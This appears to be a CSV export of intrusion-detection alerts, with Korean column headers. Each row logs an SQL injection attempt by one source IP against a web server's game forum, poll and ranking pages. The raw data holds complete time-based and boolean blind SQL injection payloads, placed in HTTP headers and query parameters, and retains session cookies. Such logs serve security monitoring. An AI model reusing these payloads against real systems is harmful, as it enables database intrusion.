장비발생시간,출발지IP,목적지IP,목적지포트,공격명,raw_data
2019-03-13 9:03,203.246.171.140,139.150.87.138,80,SQL Injection," GET /wwc-bbs/article/read HTTP/1.1#015#012Referer: https://www.google.com/search?hl=en&q=testing#015#012User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21 @@kgsec-insight#015#012Client-IP: Oyghy6Uy'));select pg_sleep(3); --#015#012Cookie: TIARA=Khbrx61ixwTvoG6ARD3gC-9Ty4rEJc9OHWtIcD3KmExe_LuCNcPTgCiOTvmK3FieSOOrY9MigS5nqQyEvaL1kpLNrWR67.HN; webid=2768c9caa1d24a74b8368276cfb6dc93; webid_sync=1552432348341; AGEN=07sE-NbWY0XgdDoRe35_HL7xuA2C1gTLGfJD17ddgFY; SLEVEL=1; _DGUNCV_=IYRw0GMKrJ6WhOH6M71-zU5gaIBf7YKO-nwxkL6afU20_5pqcdVDM8fjYp49J4XcGWw29dKZqoQ*; _ga=GA1.3.2089884205.1552375318; _gid=GA1.3.667454821.1552375318; TS=1552432323; HTS=dN1DXUWpIVqwAFbhzkkDhg00; HM_CU=5Bd4q3BYzif; PROF=0603012032024064024192UiQPJk7X-6w0mlxoempuua-O-jMB"
2019-03-13 9:03,203.246.171.140,139.150.87.138,80,SQL Injection," GET /wwc-bbs/article/read HTTP/1.1#015#012Referer: https://www.google.com/search?hl=en&q=testing#015#012User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21 @@kgsec-insight#015#012Accept-Language: -1); waitfor delay '0:0:9' --#015#012Cookie: TIARA=Khbrx61ixwTvoG6ARD3gC-9Ty4rEJc9OHWtIcD3KmExe_LuCNcPTgCiOTvmK3FieSOOrY9MigS5nqQyEvaL1kpLNrWR67.HN; webid=2768c9caa1d24a74b8368276cfb6dc93; webid_sync=1552432348341; AGEN=07sE-NbWY0XgdDoRe35_HL7xuA2C1gTLGfJD17ddgFY; SLEVEL=1; _DGUNCV_=IYRw0GMKrJ6WhOH6M71-zU5gaIBf7YKO-nwxkL6afU20_5pqcdVDM8fjYp49J4XcGWw29dKZqoQ*; _ga=GA1.3.2089884205.1552375318; _gid=GA1.3.667454821.1552375318; TS=1552432323; HTS=dN1DXUWpIVqwAFbhzkkDhg00; HM_CU=5Bd4q3BYzif; PROF=0603012032024064024192UiQPJk7X-6w0mlxoempuua-O-jMB"
2019-03-13 9:03,203.246.171.140,139.150.87.138,80,SQL Injection," GET /wwc-bbs/article/read HTTP/1.1#015#012Referer: https://www.google.com/search?hl=en&q=testing#015#012User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21 @@kgsec-insight#015#012Accept-Language: 1 waitfor delay '0:0:3' --#015#012Cookie: TIARA=Khbrx61ixwTvoG6ARD3gC-9Ty4rEJc9OHWtIcD3KmExe_LuCNcPTgCiOTvmK3FieSOOrY9MigS5nqQyEvaL1kpLNrWR67.HN; webid=2768c9caa1d24a74b8368276cfb6dc93; webid_sync=1552432348341; AGEN=07sE-NbWY0XgdDoRe35_HL7xuA2C1gTLGfJD17ddgFY; SLEVEL=1; _DGUNCV_=IYRw0GMKrJ6WhOH6M71-zU5gaIBf7YKO-nwxkL6afU20_5pqcdVDM8fjYp49J4XcGWw29dKZqoQ*; _ga=GA1.3.2089884205.1552375318; _gid=GA1.3.667454821.1552375318; TS=1552432323; HTS=dN1DXUWpIVqwAFbhzkkDhg00; HM_CU=5Bd4q3BYzif; PROF=0603012032024064024192UiQPJk7X-6w0mlxoempuua-O-jMB"
2019-03-13 9:03,203.246.171.140,139.150.87.138,80,SQL Injection," GET /wwc-bbs/article/read HTTP/1.1#015#012Referer: https://www.google.com/search?hl=en&q=testing#015#012User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21 @@kgsec-insight#015#012Accept-Language: -1;select pg_sleep(3); --#015#012Cookie: TIARA=Khbrx61ixwTvoG6ARD3gC-9Ty4rEJc9OHWtIcD3KmExe_LuCNcPTgCiOTvmK3FieSOOrY9MigS5nqQyEvaL1kpLNrWR67.HN; webid=2768c9caa1d24a74b8368276cfb6dc93; webid_sync=1552432348341; AGEN=07sE-NbWY0XgdDoRe35_HL7xuA2C1gTLGfJD17ddgFY; SLEVEL=1; _DGUNCV_=IYRw0GMKrJ6WhOH6M71-zU5gaIBf7YKO-nwxkL6afU20_5pqcdVDM8fjYp49J4XcGWw29dKZqoQ*; _ga=GA1.3.2089884205.1552375318; _gid=GA1.3.667454821.1552375318; TS=1552432323; HTS=dN1DXUWpIVqwAFbhzkkDhg00; HM_CU=5Bd4q3BYzif; PROF=0603012032024064024192UiQPJk7X-6w0mlxoempuua-O-jMB"
2019-03-13 9:03,203.246.171.140,139.150.87.138,80,SQL Injection," GET /wwc-bbs/article/read HTTP/1.1#015#012Referer: https://www.google.com/search?hl=en&q=testing#015#012User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21 @@kgsec-insight#015#012Accept-Language: -1);select pg_sleep(3); --#015#012Cookie: TIARA=Khbrx61ixwTvoG6ARD3gC-9Ty4rEJc9OHWtIcD3KmExe_LuCNcPTgCiOTvmK3FieSOOrY9MigS5nqQyEvaL1kpLNrWR67.HN; webid=2768c9caa1d24a74b8368276cfb6dc93; webid_sync=1552432348341; AGEN=07sE-NbWY0XgdDoRe35_HL7xuA2C1gTLGfJD17ddgFY; SLEVEL=1; _DGUNCV_=IYRw0GMKrJ6WhOH6M71-zU5gaIBf7YKO-nwxkL6afU20_5pqcdVDM8fjYp49J4XcGWw29dKZqoQ*; _ga=GA1.3.2089884205.1552375318; _gid=GA1.3.667454821.1552375318; TS=1552432323; HTS=dN1DXUWpIVqwAFbhzkkDhg00; HM_CU=5Bd4q3BYzif; PROF=0603012032024064024192UiQPJk7X-6w0mlxoempuua-O-jMB"
2019-03-13 9:03,203.246.171.140,139.150.87.138,80,SQL Injection," GET /wwc-bbs/article/read HTTP/1.1#015#012Referer: https://www.google.com/search?hl=en&q=testing#015#012User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21 @@kgsec-insight#015#012Accept-Language: -1));select pg_sleep(3); --#015#012Cookie: TIARA=Khbrx61ixwTvoG6ARD3gC-9Ty4rEJc9OHWtIcD3KmExe_LuCNcPTgCiOTvmK3FieSOOrY9MigS5nqQyEvaL1kpLNrWR67.HN; webid=2768c9caa1d24a74b8368276cfb6dc93; webid_sync=1552432348341; AGEN=07sE-NbWY0XgdDoRe35_HL7xuA2C1gTLGfJD17ddgFY; SLEVEL=1; _DGUNCV_=IYRw0GMKrJ6WhOH6M71-zU5gaIBf7YKO-nwxkL6afU20_5pqcdVDM8fjYp49J4XcGWw29dKZqoQ*; _ga=GA1.3.2089884205.1552375318; _gid=GA1.3.667454821.1552375318; TS=1552432323; HTS=dN1DXUWpIVqwAFbhzkkDhg00; HM_CU=5Bd4q3BYzif; PROF=0603012032024064024192UiQPJk7X-6w0mlxoempuua-O-jMB"
2019-03-13 9:03,203.246.171.140,139.150.87.138,80,SQL Injection," GET /wwc-bbs/article/read HTTP/1.1#015#012Referer: https://www.google.com/search?hl=en&q=testing#015#012User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21 @@kgsec-insight#015#012Accept-Language: NF5OVY9o';select pg_sleep(3); --#015#012Cookie: TIARA=Khbrx61ixwTvoG6ARD3gC-9Ty4rEJc9OHWtIcD3KmExe_LuCNcPTgCiOTvmK3FieSOOrY9MigS5nqQyEvaL1kpLNrWR67.HN; webid=2768c9caa1d24a74b8368276cfb6dc93; webid_sync=1552432348341; AGEN=07sE-NbWY0XgdDoRe35_HL7xuA2C1gTLGfJD17ddgFY; SLEVEL=1; _DGUNCV_=IYRw0GMKrJ6WhOH6M71-zU5gaIBf7YKO-nwxkL6afU20_5pqcdVDM8fjYp49J4XcGWw29dKZqoQ*; _ga=GA1.3.2089884205.1552375318; _gid=GA1.3.667454821.1552375318; TS=1552432323; HTS=dN1DXUWpIVqwAFbhzkkDhg00; HM_CU=5Bd4q3BYzif; PROF=0603012032024064024192UiQPJk7X-6w0mlxoempuua-O-jMB"
2019-03-13 9:03,203.246.171.140,139.150.87.138,80,SQL Injection," GET /wwc-bbs/article/read HTTP/1.1#015#012Referer: https://www.google.com/search?hl=en&q=testing#015#012User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21 @@kgsec-insight#015#012Accept-Language: LZq2rrqH');select pg_sleep(6); --#015#012Cookie: TIARA=Khbrx61ixwTvoG6ARD3gC-9Ty4rEJc9OHWtIcD3KmExe_LuCNcPTgCiOTvmK3FieSOOrY9MigS5nqQyEvaL1kpLNrWR67.HN; webid=2768c9caa1d24a74b8368276cfb6dc93; webid_sync=1552432348341; AGEN=07sE-NbWY0XgdDoRe35_HL7xuA2C1gTLGfJD17ddgFY; SLEVEL=1; _DGUNCV_=IYRw0GMKrJ6WhOH6M71-zU5gaIBf7YKO-nwxkL6afU20_5pqcdVDM8fjYp49J4XcGWw29dKZqoQ*; _ga=GA1.3.2089884205.1552375318; _gid=GA1.3.667454821.1552375318; TS=1552432323; HTS=dN1DXUWpIVqwAFbhzkkDhg00; HM_CU=5Bd4q3BYzif; PROF=0603012032024064024192UiQPJk7X-6w0mlxoempuua-O-jMB"
2019-03-13 9:03,203.246.171.140,139.150.87.138,80,SQL Injection," GET /wwc-bbs/article/read HTTP/1.1#015#012Referer: https://www.google.com/search?hl=en&q=testing#015#012User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21 @@kgsec-insight#015#012Accept-Language: Y30tKsA3'));select pg_sleep(6); --#015#012Cookie: TIARA=Khbrx61ixwTvoG6ARD3gC-9Ty4rEJc9OHWtIcD3KmExe_LuCNcPTgCiOTvmK3FieSOOrY9MigS5nqQyEvaL1kpLNrWR67.HN; webid=2768c9caa1d24a74b8368276cfb6dc93; webid_sync=1552432348341; AGEN=07sE-NbWY0XgdDoRe35_HL7xuA2C1gTLGfJD17ddgFY; SLEVEL=1; _DGUNCV_=IYRw0GMKrJ6WhOH6M71-zU5gaIBf7YKO-nwxkL6afU20_5pqcdVDM8fjYp49J4XcGWw29dKZqoQ*; _ga=GA1.3.2089884205.1552375318; _gid=GA1.3.667454821.1552375318; TS=1552432323; HTS=dN1DXUWpIVqwAFbhzkkDhg00; HM_CU=5Bd4q3BYzif; PROF=0603012032024064024192UiQPJk7X-6w0mlxoempuua-O-jMB"
2019-03-13 9:03,203.246.171.140,139.150.87.138,80,SQL Injection," GET /wwc-bbs/article/read HTTP/1.1#015#012Referer: https://www.google.com/search?hl=en&q=testing#015#012User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21 @@kgsec-insight#015#012X-Forwarded-Host: -1); waitfor delay '0:0:3' --#015#012Cookie: TIARA=Khbrx61ixwTvoG6ARD3gC-9Ty4rEJc9OHWtIcD3KmExe_LuCNcPTgCiOTvmK3FieSOOrY9MigS5nqQyEvaL1kpLNrWR67.HN; webid=2768c9caa1d24a74b8368276cfb6dc93; webid_sync=1552432348341; AGEN=07sE-NbWY0XgdDoRe35_HL7xuA2C1gTLGfJD17ddgFY; SLEVEL=1; _DGUNCV_=IYRw0GMKrJ6WhOH6M71-zU5gaIBf7YKO-nwxkL6afU20_5pqcdVDM8fjYp49J4XcGWw29dKZqoQ*; _ga=GA1.3.2089884205.1552375318; _gid=GA1.3.667454821.1552375318; TS=1552432323; HTS=dN1DXUWpIVqwAFbhzkkDhg00; HM_CU=5Bd4q3BYzif; PROF=0603012032024064024192UiQPJk7X-6w0mlxoempuua-O-jMB"
2019-03-13 9:03,203.246.171.140,139.150.87.138,80,SQL Injection," GET /wwc-bbs/article/read HTTP/1.1#015#012Referer: https://www.google.com/search?hl=en&q=testing#015#012User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21 @@kgsec-insight#015#012Accept-Language: -1; waitfor delay '0:0:9' --#015#012Cookie: TIARA=Khbrx61ixwTvoG6ARD3gC-9Ty4rEJc9OHWtIcD3KmExe_LuCNcPTgCiOTvmK3FieSOOrY9MigS5nqQyEvaL1kpLNrWR67.HN; webid=2768c9caa1d24a74b8368276cfb6dc93; webid_sync=1552432348341; AGEN=07sE-NbWY0XgdDoRe35_HL7xuA2C1gTLGfJD17ddgFY; SLEVEL=1; _DGUNCV_=IYRw0GMKrJ6WhOH6M71-zU5gaIBf7YKO-nwxkL6afU20_5pqcdVDM8fjYp49J4XcGWw29dKZqoQ*; _ga=GA1.3.2089884205.1552375318; _gid=GA1.3.667454821.1552375318; TS=1552432323; HTS=dN1DXUWpIVqwAFbhzkkDhg00; HM_CU=5Bd4q3BYzif; PROF=0603012032024064024192UiQPJk7X-6w0mlxoempuua-O-jMB"
2019-03-13 9:03,203.246.171.140,139.150.87.138,80,SQL Injection," GET /wwc-bbs/article/read HTTP/1.1#015#012Referer: https://www.google.com/search?hl=en&q=testing#015#012User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21 @@kgsec-insight#015#012Accept-Language: ef6Gs46x'; waitfor delay '0:0:3' --#015#012Cookie: TIARA=Khbrx61ixwTvoG6ARD3gC-9Ty4rEJc9OHWtIcD3KmExe_LuCNcPTgCiOTvmK3FieSOOrY9MigS5nqQyEvaL1kpLNrWR67.HN; webid=2768c9caa1d24a74b8368276cfb6dc93; webid_sync=1552432348341; AGEN=07sE-NbWY0XgdDoRe35_HL7xuA2C1gTLGfJD17ddgFY; SLEVEL=1; _DGUNCV_=IYRw0GMKrJ6WhOH6M71-zU5gaIBf7YKO-nwxkL6afU20_5pqcdVDM8fjYp49J4XcGWw29dKZqoQ*; _ga=GA1.3.2089884205.1552375318; _gid=GA1.3.667454821.1552375318; TS=1552432323; HTS=dN1DXUWpIVqwAFbhzkkDhg00; HM_CU=5Bd4q3BYzif; PROF=0603012032024064024192UiQPJk7X-6w0mlxoempuua-O-jMB"
2019-03-13 9:31,203.246.171.140,139.150.87.138,80,SQL Injection, /wwc-bbs/article/list?_=Bwgj1LUV');select%20pg_sleep(6);%20--%20&ctgNo=&ctgNo=T&searchText=icarus&searchType=1552432819469&svcId=114
2019-03-13 9:29,203.246.171.140,139.150.87.138,80,SQL Injection, /wwc-bbs/article/list?_=JHe53BHd';%20waitfor%20delay%20'0:0:3'%20--%20&ctgNo=&ctgNo=T&searchText=icarus&searchType=1552432819469&svcId=114
2019-03-13 9:28,203.246.171.140,139.150.87.138,80,SQL Injection, /wemade-poll/poll/list?gameCode=-1%20OR%203%2B180-180-1=0%2B0%2B0%2B1
2019-03-13 9:28,203.246.171.140,139.150.87.138,80,SQL Injection, /wemade-poll/poll/list?gameCode=-1%20OR%202%2B602-602-1=0%2B0%2B0%2B1%20--%20
2019-03-13 9:28,203.246.171.140,139.150.87.138,80,SQL Injection, /wemade-poll/poll/list?gameCode=-1%20OR%203%2B602-602-1=0%2B0%2B0%2B1%20--%20
2019-03-13 9:28,203.246.171.140,139.150.87.138,80,SQL Injection, /wemade-poll/poll/list?gameCode=-1%20OR%202%2B180-180-1=0%2B0%2B0%2B1
2019-03-13 9:28,203.246.171.140,139.150.87.138,80,SQL Injection, /wemade-poll/poll/list?gameCode=0'XOR(if(now()=sysdate()%2Csleep(3)%2C0))XOR'Z
2019-03-13 9:28,203.246.171.140,139.150.87.138,80,SQL Injection, /wemade-poll/poll/list?gameCode=XIT2ybMw'));select%20pg_sleep(9);%20--%20
2019-03-13 9:28,203.246.171.140,139.150.87.138,80,SQL Injection, /wemade-poll/poll/list?gameCode=icarus%25'%20AND%202*3*8=6*8%20AND%20'd0eg'!='d0eg%25
2019-03-13 9:01,203.246.171.140,139.150.87.138,80,SQL Injection, id=1&memberid=%EC%95%84%EC%9D%B4%EB%94%94&memberpw=1&pw=1&pwTxt=lYpR9Wv1'));select%20pg_sleep(9);%20--%20&returnUrl=1
2019-03-13 9:01,203.246.171.140,139.150.87.138,80,SQL Injection, id=1&memberid=%EC%95%84%EC%9D%B4%EB%94%94&memberpw=1&pw=1&pwTxt=%EB%B9%84%EB%B0%80%EB%B2%88%ED%98%B8&returnUrl=-1));select%20pg_sleep(3);%20--%20
2019-03-13 9:01,203.246.171.140,139.150.87.138,80,SQL Injection, id=1&memberid=%EC%95%84%EC%9D%B4%EB%94%94&memberpw=1&pw=1&pwTxt=%EB%B9%84%EB%B0%80%EB%B2%88%ED%98%B8&returnUrl=cJP604BS';select%20pg_sleep(3);%20--%20
2019-03-13 9:01,203.246.171.140,139.150.87.138,80,SQL Injection, id=1&memberid=%EC%95%84%EC%9D%B4%EB%94%94&memberpw=1&pw=1&pwTxt=%EB%B9%84%EB%B0%80%EB%B2%88%ED%98%B8&returnUrl=iMMN7DZ5');select%20pg_sleep(3);%20--%20
2019-03-13 9:01,203.246.171.140,139.150.87.138,80,SQL Injection, id=1&memberid=%EC%95%84%EC%9D%B4%EB%94%94&memberpw=1&pw=1&pwTxt=%EB%B9%84%EB%B0%80%EB%B2%88%ED%98%B8&returnUrl=Y9WqnERX'));select%20pg_sleep(3);%20--%20
2019-03-13 9:14,203.246.171.140,139.150.87.138,80,SQL Injection," GET /wemade-poll/poll/list HTTP/1.1#015#012Referer: https://www.google.com/search?hl=en&q=testing#015#012User-Agent: 0'XOR(if(now()=sysdate(),sleep(3),0))XOR'Z#015#012Cookie: TIARA=Khbrx61ixwTvoG6ARD3gC-9Ty4rEJc9OHWtIcD3KmExe_LuCNcPTgCiOTvmK3FieSOOrY9MigS5nqQyEvaL1kpLNrWR67.HN; webid=2768c9caa1d24a74b8368276cfb6dc93; webid_sync=1552432348341; AGEN=07sE-NbWY0XgdDoRe35_HL7xuA2C1gTLGfJD17ddgFY; SLEVEL=1; _DGUNCV_=IYRw0GMKrJ6WhOH6M71-zU5gaIBf7YKO-nwxkL6afU20_5pqcdVDM8fjYp49J4XcGWw29dKZqoQ*; _ga=GA1.3.2089884205.1552375318; _gid=GA1.3.667454821.1552375318; TS=1552432323; HTS=dN1DXUWpIVqwAFbhzkkDhg00; HM_CU=5Bd4q3BYzif; PROF=0603012032024064024192UiQPJk7X-6w0mlxoempuua-O-jMB"
2019-03-13 9:14,203.246.171.140,139.150.87.138,80,SQL Injection," GET /wemade-poll/poll/list HTTP/1.1#015#012Referer: https://www.google.com/search?hl=en&q=testing#015#012User-Agent: 0""XOR(if(now()=sysdate(),sleep(3),0))XOR""Z#015#012Cookie: TIARA=Khbrx61ixwTvoG6ARD3gC-9Ty4rEJc9OHWtIcD3KmExe_LuCNcPTgCiOTvmK3FieSOOrY9MigS5nqQyEvaL1kpLNrWR67.HN; webid=2768c9caa1d24a74b8368276cfb6dc93; webid_sync=1552432348341; AGEN=07sE-NbWY0XgdDoRe35_HL7xuA2C1gTLGfJD17ddgFY; SLEVEL=1; _DGUNCV_=IYRw0GMKrJ6WhOH6M71-zU5gaIBf7YKO-nwxkL6afU20_5pqcdVDM8fjYp49J4XcGWw29dKZqoQ*; _ga=GA1.3.2089884205.1552375318; _gid=GA1.3.667454821.1552375318; TS=1552432323; HTS=dN1DXUWpIVqwAFbhzkkDhg00; HM_CU=5Bd4q3BYzif; PROF=0603012032024064024192UiQPJk7X-6w0mlxoempuua-O-jMB"
2019-03-13 9:14,203.246.171.140,139.150.87.138,80,SQL Injection," GET /wemade-poll/poll/list HTTP/1.1#015#012Referer: https://www.google.com/search?hl=en&q=testing#015#012User-Agent: (select(0)from(select(sleep(3)))v)/*'+(select(0)from(select(sleep(3)))v)+'""+(select(0)from(select(sleep(3)))v)+""*/#015#012Cookie: TIARA=Khbrx61ixwTvoG6ARD3gC-9Ty4rEJc9OHWtIcD3KmExe_LuCNcPTgCiOTvmK3FieSOOrY9MigS5nqQyEvaL1kpLNrWR67.HN; webid=2768c9caa1d24a74b8368276cfb6dc93; webid_sync=1552432348341; AGEN=07sE-NbWY0XgdDoRe35_HL7xuA2C1gTLGfJD17ddgFY; SLEVEL=1; _DGUNCV_=IYRw0GMKrJ6WhOH6M71-zU5gaIBf7YKO-nwxkL6afU20_5pqcdVDM8fjYp49J4XcGWw29dKZqoQ*; _ga=GA1.3.2089884205.1552375318; _gid=GA1.3.667454821.1552375318; TS=1552432323; HTS=dN1DXUWpIVqwAFbhzkkDhg00; HM_CU=5Bd4q3BYzif; PROF=0603012032024064024192UiQPJk7X-6w0mlxoempuua-O-jMB"
2019-03-13 9:16,203.246.171.140,139.150.87.138,80,SQL Injection, /wwc-bbs/article/list?_=1552434432271&artType=&ctgNo=zeDXyM1M';%20waitfor%20delay%20'0:0:9'%20--%20&inner_list=1&searchText=&searchType=&svcId=icarus
2019-03-13 9:03,203.246.171.140,139.150.87.138,80,SQL Injection, /wwc-bbs/article/read?_=-1'%20OR%203*2<(0%2B5%2B699-699)%20--%20&artSeq=1433327&ctgNo=14
2019-03-13 9:03,203.246.171.140,139.150.87.138,80,SQL Injection, /wwc-bbs/article/read?_=-1'%20OR%203*2>(0%2B5%2B699-699)%20--%20&artSeq=1433327&ctgNo=14
2019-03-13 9:03,203.246.171.140,139.150.87.138,80,SQL Injection, /wwc-bbs/article/read?_=-1'%20OR%202%2B421-421-1=0%2B0%2B0%2B1%20or%20'hdVDfjmH'='&artSeq=1433327&ctgNo=14
2019-03-13 9:03,203.246.171.140,139.150.87.138,80,SQL Injection, /wwc-bbs/article/list?_=-1;%20waitfor%20delay%20'0:0:6'%20--%20&artType=&ctgNo=14&inner_list=1&searchText=&searchType=&svcId=icarus
2019-03-13 9:32,203.246.171.140,139.150.87.138,80,SQL Injection," /world/tower/rank?cate=0&classCode=(select(0)from(select(sleep(6)))v)/*'%2B(select(0)from(select(sleep(6)))v)%2B'""%2B(select(0)from(select(sleep(6)))v)%2B""*/&serverKey=1"
2019-03-13 9:32,203.246.171.140,139.150.87.138,80,SQL Injection, /world/tower/rank?cate=0&classCode=1%20waitfor%20delay%20'0:0:9'%20--%20&serverKey=1
2019-03-13 9:32,203.246.171.140,139.150.87.138,80,SQL Injection," /world/tower/rank?cate=0&classCode=-1""%20OR%202%2B957-957-1=0%2B0%2B0%2B1%20--%20&serverKey=1"
2019-03-13 9:32,203.246.171.140,139.150.87.138,80,SQL Injection, /world/tower/rank?cate=0&classCode=0'XOR(if(now()=sysdate()%2Csleep(6)%2C0))XOR'Z&serverKey=1
2019-03-13 9:32,203.246.171.140,139.150.87.138,80,SQL Injection," /world/tower/rank?cate=0&classCode=0""XOR(if(now()=sysdate()%2Csleep(6)%2C0))XOR""Z&serverKey=1"
2019-03-13 9:37,203.246.171.140,139.150.87.138,80,SQL Injection, /wwc-bbs/article/list?_=114&ctgNo=0'XOR(if(now()=sysdate()%2Csleep(6)%2C0))XOR'Z&ctgNo=T&searchText=icarus&searchType=1552432819469&svcId=114
2019-03-13 9:32,203.246.171.140,139.150.87.138,80,SQL Injection," GET / HTTP/1.1#015#012Referer: https://www.google.com/search?hl=en&q=testing#015#012User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21 @@kgsec-insight#015#012Origin: WOcqVGjw'; waitfor delay '0:0:3' --#015#012Cookie: TIARA=Khbrx61ixwTvoG6ARD3gC-9Ty4rEJc9OHWtIcD3KmExe_LuCNcPTgCiOTvmK3FieSOOrY9MigS5nqQyEvaL1kpLNrWR67.HN; webid=2768c9caa1d24a74b8368276cfb6dc93; webid_sync=1552432348341; AGEN=07sE-NbWY0XgdDoRe35_HL7xuA2C1gTLGfJD17ddgFY; SLEVEL=1; _DGUNCV_=IYRw0GMKrJ6WhOH6M71-zU5gaIBf7YKO-nwxkL6afU20_5pqcdVDM8fjYp49J4XcGWw29dKZqoQ*; _ga=GA1.3.2089884205.1552375318; _gid=GA1.3.667454821.1552375318; TS=1552432323; HTS=dN1DXUWpIVqwAFbhzkkDhg00; HM_CU=5Bd4q3BYzif; PROF=0603012032024064024192UiQPJk7X-6w0mlxoempuua-O-jMB"
2019-03-13 9:32,203.246.171.140,139.150.87.138,80,SQL Injection," GET / HTTP/1.1#015#012Referer: https://www.google.com/search?hl=en&q=testing#015#012User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21 @@kgsec-insight#015#012Origin: -1;select pg_sleep(3); --#015#012Cookie: TIARA=Khbrx61ixwTvoG6ARD3gC-9Ty4rEJc9OHWtIcD3KmExe_LuCNcPTgCiOTvmK3FieSOOrY9MigS5nqQyEvaL1kpLNrWR67.HN; webid=2768c9caa1d24a74b8368276cfb6dc93; webid_sync=1552432348341; AGEN=07sE-NbWY0XgdDoRe35_HL7xuA2C1gTLGfJD17ddgFY; SLEVEL=1; _DGUNCV_=IYRw0GMKrJ6WhOH6M71-zU5gaIBf7YKO-nwxkL6afU20_5pqcdVDM8fjYp49J4XcGWw29dKZqoQ*; _ga=GA1.3.2089884205.1552375318; _gid=GA1.3.667454821.1552375318; TS=1552432323; HTS=dN1DXUWpIVqwAFbhzkkDhg00; HM_CU=5Bd4q3BYzif; PROF=0603012032024064024192UiQPJk7X-6w0mlxoempuua-O-jMB"
2019-03-13 9:32,203.246.171.140,139.150.87.138,80,SQL Injection," GET / HTTP/1.1#015#012Referer: https://www.google.com/search?hl=en&q=testing#015#012User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21 @@kgsec-insight#015#012Origin: -1);select pg_sleep(6); --#015#012Cookie: TIARA=Khbrx61ixwTvoG6ARD3gC-9Ty4rEJc9OHWtIcD3KmExe_LuCNcPTgCiOTvmK3FieSOOrY9MigS5nqQyEvaL1kpLNrWR67.HN; webid=2768c9caa1d24a74b8368276cfb6dc93; webid_sync=1552432348341; AGEN=07sE-NbWY0XgdDoRe35_HL7xuA2C1gTLGfJD17ddgFY; SLEVEL=1; _DGUNCV_=IYRw0GMKrJ6WhOH6M71-zU5gaIBf7YKO-nwxkL6afU20_5pqcdVDM8fjYp49J4XcGWw29dKZqoQ*; _ga=GA1.3.2089884205.1552375318; _gid=GA1.3.667454821.1552375318; TS=1552432323; HTS=dN1DXUWpIVqwAFbhzkkDhg00; HM_CU=5Bd4q3BYzif; PROF=0603012032024064024192UiQPJk7X-6w0mlxoempuua-O-jMB"
